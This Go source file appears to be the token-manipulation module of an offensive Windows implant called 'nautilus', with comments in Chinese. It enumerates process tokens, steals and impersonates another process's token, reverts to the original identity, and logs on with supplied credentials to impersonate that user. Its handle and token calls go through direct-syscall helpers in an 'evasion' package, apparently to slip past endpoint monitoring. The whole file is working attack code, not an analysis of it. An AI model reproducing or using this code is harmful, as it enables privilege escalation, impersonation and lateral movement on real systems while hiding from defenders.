//go:build windows

package core

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"nautilus/evasion"
)

const (
	PROCESS_QUERY_INFORMATION         = 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000

	TOKEN_QUERY       = 0x0008
	TOKEN_DUPLICATE   = 0x0002
	TOKEN_IMPERSONATE = 0x0004
	TOKEN_ALL_ACCESS  = 0xF01FF

	// TOKEN_INFORMATION_CLASS
	TokenUser           = 1
	TokenGroups         = 2
	TokenPrivilegesInfo = 3
	TokenIntegrityLevel = 25

	TokenPrimary       = 1
	TokenImpersonation = 2

	SecurityImpersonation = 2

	ThreadImpersonationToken = 5
)

type SID_NAME_USE uint32

type tokenUser struct {
	User sidAndAttributes
}

type tokenGroups struct {
	GroupCount uint32
	Groups     [1]sidAndAttributes
}

type tokenPrivilegesInfo struct {
	PrivilegeCount uint32
	Privileges     [1]luidAndAttributes
}

type tokenMandatoryLabel struct {
	Label sidAndAttributes
}

type sidAndAttributes struct {
	Sid        *byte
	Attributes uint32
}

type luidAndAttributes struct {
	Luid       LUID
	Attributes uint32
}

var integrityLevels = map[uint32]string{
	0x0000: "Untrusted",
	0x1000: "Low",
	0x2000: "Medium",
	0x2100: "Medium+",
	0x3000: "High",
	0x4000: "System",
	0x5000: "Protected",
}

func sidToRid(sid *byte) uint32 {
	subCount := *(*byte)(unsafe.Add(unsafe.Pointer(sid), 1))
	lastOffset := uintptr(8 + (uint32(subCount)-1)*4)
	return *(*uint32)(unsafe.Add(unsafe.Pointer(sid), lastOffset))
}

func sidToString(sid *byte) string {
	subCount := *(*byte)(unsafe.Add(unsafe.Pointer(sid), 1))
	authority := *(*[6]byte)(unsafe.Add(unsafe.Pointer(sid), 2))
	authVal := uint64(authority[0])<<40 | uint64(authority[1])<<32 |
		uint64(authority[2])<<24 | uint64(authority[3])<<16 |
		uint64(authority[4])<<8 | uint64(authority[5])

	var parts []string
	parts = append(parts, fmt.Sprintf("S-1-%d", authVal))
	for i := byte(0); i < subCount; i++ {
		offset := uintptr(8 + uint32(i)*4)
		sub := *(*uint32)(unsafe.Add(unsafe.Pointer(sid), offset))
		parts = append(parts, fmt.Sprintf("%d", sub))
	}
	return strings.Join(parts, "-")
}

var wellKnownSids = map[string]string{
	"S-1-5-18":     "NT AUTHORITY\\SYSTEM",
	"S-1-5-19":     "NT AUTHORITY\\LOCAL SERVICE",
	"S-1-5-20":     "NT AUTHORITY\\NETWORK SERVICE",
	"S-1-5-32-544": "BUILTIN\\Administrators",
	"S-1-5-32-545": "BUILTIN\\Users",
	"S-1-5-32-546": "BUILTIN\\Guests",
}

func lookupSid(sid *byte) string {
	sidStr := sidToString(sid)
	if name, ok := wellKnownSids[sidStr]; ok {
		return name
	}

	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procLookup := advapi32.NewProc("LookupAccountSidW")

	var nameLen, domainLen uint32 = 256, 256
	nameBuf := make([]uint16, nameLen)
	domainBuf := make([]uint16, domainLen)
	var sidType SID_NAME_USE

	r1, _, _ := procLookup.Call(
		0,
		uintptr(unsafe.Pointer(sid)),
		uintptr(unsafe.Pointer(&nameBuf[0])),
		uintptr(unsafe.Pointer(&nameLen)),
		uintptr(unsafe.Pointer(&domainBuf[0])),
		uintptr(unsafe.Pointer(&domainLen)),
		uintptr(unsafe.Pointer(&sidType)),
	)
	if r1 != 0 {
		name := syscall.UTF16ToString(nameBuf[:nameLen])
		domain := syscall.UTF16ToString(domainBuf[:domainLen])
		if domain != "" {
			return domain + "\\" + name
		}
		return name
	}
	return sidStr
}

func lookupPrivNameStr(luid LUID) string {
	// 常见特权 LUID → 名称映射
	knownPrivs := map[uint32]string{
		2:  "SeCreateTokenPrivilege",
		3:  "SeAssignPrimaryTokenPrivilege",
		4:  "SeLockMemoryPrivilege",
		5:  "SeIncreaseQuotaPrivilege",
		6:  "SeMachineAccountPrivilege",
		7:  "SeTcbPrivilege",
		8:  "SeSecurityPrivilege",
		9:  "SeTakeOwnershipPrivilege",
		10: "SeLoadDriverPrivilege",
		11: "SeSystemProfilePrivilege",
		12: "SeSystemtimePrivilege",
		13: "SeProfileSingleProcessPrivilege",
		14: "SeIncreaseBasePriorityPrivilege",
		15: "SeCreatePagefilePrivilege",
		16: "SeCreatePermanentPrivilege",
		17: "SeBackupPrivilege",
		18: "SeRestorePrivilege",
		19: "SeShutdownPrivilege",
		20: "SeDebugPrivilege",
		21: "SeAuditPrivilege",
		22: "SeSystemEnvironmentPrivilege",
		23: "SeChangeNotifyPrivilege",
		24: "SeRemoteShutdownPrivilege",
		25: "SeUndockPrivilege",
		26: "SeSyncAgentPrivilege",
		27: "SeEnableDelegationPrivilege",
		28: "SeManageVolumePrivilege",
		29: "SeImpersonatePrivilege",
		30: "SeCreateGlobalPrivilege",
		31: "SeTrustedCredManAccessPrivilege",
		32: "SeRelabelPrivilege",
		33: "SeIncreaseWorkingSetPrivilege",
		34: "SeTimeZonePrivilege",
		35: "SeCreateSymbolicLinkPrivilege",
		36: "SeDelegateSessionUserImpersonatePrivilege",
	}
	if name, ok := knownPrivs[luid.LowPart]; ok {
		return name
	}
	return fmt.Sprintf("SePrivilege-%d", luid.LowPart)
}

func getIntegrityLevel(sid *byte) string {
	rid := sidToRid(sid)
	if name, ok := integrityLevels[rid]; ok {
		return name
	}
	return fmt.Sprintf("0x%04X", rid)
}

func EnumTokens() (string, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateSnapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcessFirst := kernel32.NewProc("Process32FirstW")
	procProcessNext := kernel32.NewProc("Process32NextW")

	type PROCESSENTRY32W struct {
		Size            uint32
		Usage           uint32
		ProcessID       uint32
		DefaultHeapID   uintptr
		ModuleID        uint32
		Threads         uint32
		ParentProcessID uint32
		PriClassBase    int32
		Flags           uint32
		ExeFile         [260]uint16
	}

	hSnapshot, _, _ := procCreateSnapshot.Call(2, 0)
	if hSnapshot == 0 || hSnapshot == ^uintptr(0) {
		return "", fmt.Errorf("CreateToolhelp32Snapshot failed")
	}
	defer evasion.DirectNtClose(hSnapshot)

	var result strings.Builder
	result.WriteString(fmt.Sprintf("%-8s %-8s %-45s %-12s\n", "PID", "Name", "User", "Integrity"))
	result.WriteString(strings.Repeat("-", 80) + "\n")

	var pe PROCESSENTRY32W
	pe.Size = uint32(unsafe.Sizeof(pe))

	r1, _, _ := procProcessFirst.Call(hSnapshot, uintptr(unsafe.Pointer(&pe)))
	if r1 == 0 {
		return "", fmt.Errorf("Process32FirstW failed")
	}

	type clientID struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}
	type objectAttributes struct {
		Length                   uint32
		RootDirectory            uintptr
		ObjectName               *uint16
		Attributes               uint32
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}

	for {
		pid := pe.ProcessID
		procName := syscall.UTF16ToString(pe.ExeFile[:])

		var hProcess, hToken uintptr
		cid := clientID{UniqueProcess: uintptr(pid)}
		var oa objectAttributes
		oa.Length = uint32(unsafe.Sizeof(oa))

		// 先尝试完整权限，失败则降级为LIMITED（Vista+无需特殊权限）
		status := evasion.DirectNtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION,
			(*uintptr)(unsafe.Pointer(&oa)), (*uintptr)(unsafe.Pointer(&cid)))
		if evasion.NtStatusIsError(status) {
			status = evasion.DirectNtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION,
				(*uintptr)(unsafe.Pointer(&oa)), (*uintptr)(unsafe.Pointer(&cid)))
			if evasion.NtStatusIsError(status) {
				goto next
			}
		}

		// 尝试完整token权限，失败则降级为仅QUERY
		status = evasion.DirectNtOpenProcessToken(hProcess, TOKEN_QUERY|TOKEN_DUPLICATE, &hToken)
		if evasion.NtStatusIsError(status) {
			status = evasion.DirectNtOpenProcessToken(hProcess, TOKEN_QUERY, &hToken)
			if evasion.NtStatusIsError(status) {
				evasion.DirectNtClose(hProcess)
				goto next
			}
		}

		{
			userBuf := make([]byte, 512)
			var retLen uint32
			userName := ""
			status = evasion.DirectNtQueryInformationToken(hToken, TokenUser, &userBuf[0], 512, &retLen)
			if !evasion.NtStatusIsError(status) {
				user := (*tokenUser)(unsafe.Pointer(&userBuf[0]))
				userName = lookupSid(user.User.Sid)
			}

			ilBuf := make([]byte, 256)
			ilName := ""
			status = evasion.DirectNtQueryInformationToken(hToken, TokenIntegrityLevel, &ilBuf[0], 256, &retLen)
			if !evasion.NtStatusIsError(status) {
				il := (*tokenMandatoryLabel)(unsafe.Pointer(&ilBuf[0]))
				ilName = getIntegrityLevel(il.Label.Sid)
			}

			result.WriteString(fmt.Sprintf("%-8d %-8s %-45s %-12s\n",
				pid, procName, userName, ilName))
		}

		evasion.DirectNtClose(hToken)
		evasion.DirectNtClose(hProcess)

	next:
		r1, _, _ = procProcessNext.Call(hSnapshot, uintptr(unsafe.Pointer(&pe)))
		if r1 == 0 {
			break
		}
	}

	return result.String(), nil
}

func StealToken(pid uint32) (string, error) {
	type clientID struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}
	cid := clientID{UniqueProcess: uintptr(pid)}
	type objectAttributes struct {
		Length                   uint32
		RootDirectory            uintptr
		ObjectName               *uint16
		Attributes               uint32
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}
	var oa objectAttributes
	oa.Length = uint32(unsafe.Sizeof(oa))

	// IsElevated() 通过 TokenElevation 可靠判断管理员权限
	isAdmin := IsElevated()

	var hProcess uintptr
	// 先尝试完整权限
	status := evasion.DirectNtOpenProcess(&hProcess,
		PROCESS_QUERY_INFORMATION,
		(*uintptr)(unsafe.Pointer(&oa)),
		(*uintptr)(unsafe.Pointer(&cid)))
	if evasion.NtStatusIsError(status) {
		// 降级: PROCESS_QUERY_LIMITED_INFORMATION
		status = evasion.DirectNtOpenProcess(&hProcess,
			PROCESS_QUERY_LIMITED_INFORMATION,
			(*uintptr)(unsafe.Pointer(&oa)),
			(*uintptr)(unsafe.Pointer(&cid)))
		if evasion.NtStatusIsError(status) {
			if !isAdmin {
				return "", fmt.Errorf("NtOpenProcess(%d) failed: 0x%08X (not admin, cannot open other user's process)", pid, uint32(status))
			}
			return "", fmt.Errorf("NtOpenProcess(%d) failed: 0x%08X", pid, uint32(status))
		}
	}
	defer evasion.DirectNtClose(hProcess)

	var hToken uintptr
	// 先尝试完整token权限
	status = evasion.DirectNtOpenProcessToken(hProcess,
		TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_IMPERSONATE,
		&hToken)
	if evasion.NtStatusIsError(status) {
		// 降级: 仅QUERY — 至少获取用户名
		status = evasion.DirectNtOpenProcessToken(hProcess, TOKEN_QUERY, &hToken)
		if evasion.NtStatusIsError(status) {
			return "", fmt.Errorf("NtOpenProcessToken(%d) failed: 0x%08X", pid, uint32(status))
		}
		// 仅QUERY无法DUPLICATE，但至少能获取用户名
		userBuf := make([]byte, 512)
		var retLen uint32
		userName := "unknown"
		s := evasion.DirectNtQueryInformationToken(hToken, TokenUser, &userBuf[0], 512, &retLen)
		if !evasion.NtStatusIsError(s) {
			user := (*tokenUser)(unsafe.Pointer(&userBuf[0]))
			userName = lookupSid(user.User.Sid)
		}
		evasion.DirectNtClose(hToken)
		if !isAdmin {
			return "", fmt.Errorf("token query only (not admin), cannot duplicate token of PID %d (%s)", pid, userName)
		}
		return "", fmt.Errorf("NtOpenProcessToken(%d) DUPLICATE access denied: 0x%08X, user=%s", pid, uint32(status), userName)
	}

	userBuf := make([]byte, 512)
	var retLen uint32
	userName := "unknown"
	status = evasion.DirectNtQueryInformationToken(hToken, TokenUser, &userBuf[0], 512, &retLen)
	if !evasion.NtStatusIsError(status) {
		user := (*tokenUser)(unsafe.Pointer(&userBuf[0]))
		userName = lookupSid(user.User.Sid)
	}

	var dupToken uintptr
	var dupOA objectAttributes
	dupOA.Length = uint32(unsafe.Sizeof(dupOA))
	status = evasion.DirectNtDuplicateToken(hToken,
		TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY,
		(*uintptr)(unsafe.Pointer(&dupOA)),
		SecurityImpersonation,
		TokenImpersonation,
		&dupToken)
	if evasion.NtStatusIsError(status) {
		evasion.DirectNtClose(hToken)
		return "", fmt.Errorf("NtDuplicateToken failed: 0x%08X dupToken=%X", uint32(status), dupToken)
	}

	// 通过 ntdll.dll 调用 NtSetInformationThread（伪句柄 -2 经直接 syscall 会失败）
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	procNtSetInfoThread := ntdll.NewProc("NtSetInformationThread")
	r1, _, _ := procNtSetInfoThread.Call(
		^uintptr(1), // GetCurrentThread() pseudohandle (-2)
		uintptr(ThreadImpersonationToken),
		uintptr(unsafe.Pointer(&dupToken)),
		uintptr(unsafe.Sizeof(dupToken)))
	status = uintptr(r1)
	if evasion.NtStatusIsError(status) {
		evasion.DirectNtClose(dupToken)
		evasion.DirectNtClose(hToken)
		return "", fmt.Errorf("NtSetInformationThread(impersonate) failed: 0x%08X hProcess=%X hToken=%X", uint32(status), hProcess, hToken)
	}

	// 查询 dupToken 的详细信息
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Stole token from PID %d\n", pid))
	sb.WriteString(fmt.Sprintf("  User: %s\n", userName))

	// 完整性级别
	ilBuf := make([]byte, 256)
	status = evasion.DirectNtQueryInformationToken(dupToken, TokenIntegrityLevel, &ilBuf[0], 256, &retLen)
	if !evasion.NtStatusIsError(status) {
		il := (*tokenMandatoryLabel)(unsafe.Pointer(&ilBuf[0]))
		sb.WriteString(fmt.Sprintf("  Integrity: %s\n", getIntegrityLevel(il.Label.Sid)))
	}

	// 特权列表
	privBuf := make([]byte, 4096)
	status = evasion.DirectNtQueryInformationToken(dupToken, TokenPrivilegesInfo, &privBuf[0], 4096, &retLen)
	if !evasion.NtStatusIsError(status) {
		tp := (*tokenPrivilegesInfo)(unsafe.Pointer(&privBuf[0]))
		privCount := tp.PrivilegeCount
		sb.WriteString(fmt.Sprintf("  Privileges (%d):\n", privCount))
		privSlice := unsafe.Slice(&tp.Privileges[0], privCount)
		for _, priv := range privSlice {
			privName := lookupPrivNameStr(priv.Luid)
			enabled := ""
			if priv.Attributes&2 != 0 { // SE_PRIVILEGE_ENABLED
				enabled = " *"
			}
			sb.WriteString(fmt.Sprintf("    %s%s\n", privName, enabled))
		}
	}

	// 组列表
	grpBuf := make([]byte, 4096)
	status = evasion.DirectNtQueryInformationToken(dupToken, TokenGroups, &grpBuf[0], 4096, &retLen)
	if !evasion.NtStatusIsError(status) {
		tg := (*tokenGroups)(unsafe.Pointer(&grpBuf[0]))
		sb.WriteString(fmt.Sprintf("  Groups (%d):\n", tg.GroupCount))
		grpSlice := unsafe.Slice(&tg.Groups[0], tg.GroupCount)
		for _, grp := range grpSlice {
			grpName := lookupSid(grp.Sid)
			attr := ""
			if grp.Attributes&0x10 != 0 { // SE_GROUP_MANDATORY
				attr += " [M]"
			}
			if grp.Attributes&0x20 != 0 { // SE_GROUP_ENABLED_BY_DEFAULT
				attr += " [D]"
			}
			if grp.Attributes&0x40 != 0 { // SE_GROUP_ENABLED
				attr += " [E]"
			}
			if grp.Attributes&0x08 != 0 { // SE_GROUP_LOGON_ID
				attr += " [L]"
			}
			sb.WriteString(fmt.Sprintf("    %s%s\n", grpName, attr))
		}
	}

	evasion.DirectNtClose(hToken)

	return sb.String(), nil
}

func Rev2Self() (string, error) {
	var nullToken uintptr = 0
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	procNtSetInfoThread := ntdll.NewProc("NtSetInformationThread")
	r1, _, _ := procNtSetInfoThread.Call(
		^uintptr(1), // GetCurrentThread() pseudohandle (-2)
		uintptr(ThreadImpersonationToken),
		uintptr(unsafe.Pointer(&nullToken)),
		uintptr(unsafe.Sizeof(nullToken)))
	if evasion.NtStatusIsError(uintptr(r1)) {
		return "", fmt.Errorf("Rev2Self failed: 0x%08X", uint32(r1))
	}

	// 查询恢复后的当前 token 信息
	var sb strings.Builder
	sb.WriteString("Reverted to self\n")
	currentProc, _ := syscall.GetCurrentProcess()
	var hSelfToken syscall.Token
	err := syscall.OpenProcessToken(currentProc, syscall.TOKEN_QUERY, &hSelfToken)
	if err == nil {
		defer hSelfToken.Close()
		sb.WriteString(fmt.Sprintf("  Process token: %s\n", GetUsername()))
	}
	sb.WriteString(fmt.Sprintf("  Elevated: %v", IsElevated()))

	return sb.String(), nil
}

func MakeToken(username, password, domain string) (string, error) {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procLogonUser := advapi32.NewProc("LogonUserW")

	u, _ := syscall.UTF16PtrFromString(username)
	p, _ := syscall.UTF16PtrFromString(password)
	d, _ := syscall.UTF16PtrFromString(domain)

	var hToken uintptr
	r1, _, errNo := procLogonUser.Call(
		uintptr(unsafe.Pointer(u)),
		uintptr(unsafe.Pointer(d)),
		uintptr(unsafe.Pointer(p)),
		3, // LOGON32_LOGON_NETWORK
		0, // LOGON32_PROVIDER_DEFAULT
		uintptr(unsafe.Pointer(&hToken)),
	)
	if r1 == 0 || hToken == 0 {
		return "", fmt.Errorf("LogonUserW failed: r1=%X errno=%d hToken=%X", r1, errNo, hToken)
	}

	// 验证 token 是否有效：查询用户名
	userBuf := make([]byte, 512)
	var retLen uint32
	status := evasion.DirectNtQueryInformationToken(hToken, TokenUser, &userBuf[0], 512, &retLen)
	var tokUser string
	if !evasion.NtStatusIsError(status) {
		user := (*tokenUser)(unsafe.Pointer(&userBuf[0]))
		tokUser = lookupSid(user.User.Sid)
	}

	ntdll2 := syscall.NewLazyDLL("ntdll.dll")
	procNtSetInfoThread2 := ntdll2.NewProc("NtSetInformationThread")
	r2, _, _ := procNtSetInfoThread2.Call(
		^uintptr(1), // GetCurrentThread() pseudohandle (-2)
		uintptr(ThreadImpersonationToken),
		uintptr(unsafe.Pointer(&hToken)),
		uintptr(unsafe.Sizeof(hToken)))
	if evasion.NtStatusIsError(uintptr(r2)) {
		evasion.DirectNtClose(hToken)
		return "", fmt.Errorf("NtSetInformationThread(impersonate) failed: 0x%08X", uint32(r2))
	}

	return fmt.Sprintf("Created token for %s\\%s\n  Token user: %s", domain, username, tokUser), nil
}

func HandleToken(params map[string]string) (string, error) {
	action := params["action"]
	switch action {
	case "enum":
		return EnumTokens()
	case "steal":
		pid := uint32(0)
		fmt.Sscanf(params["pid"], "%d", &pid)
		if pid == 0 {
			return "", fmt.Errorf("invalid pid: %s", params["pid"])
		}
		return StealToken(pid)
	case "rev2self":
		return Rev2Self()
	case "make":
		user := params["user"]
		pass := params["pass"]
		domain := params["domain"]
		if domain == "" {
			domain = "."
		}
		if user == "" || pass == "" {
			return "", fmt.Errorf("usage: make_token user=<user> pass=<pass> [domain=<domain>]")
		}
		return MakeToken(user, pass, domain)
	default:
		return "", fmt.Errorf("unknown token action: %s", action)
	}
}
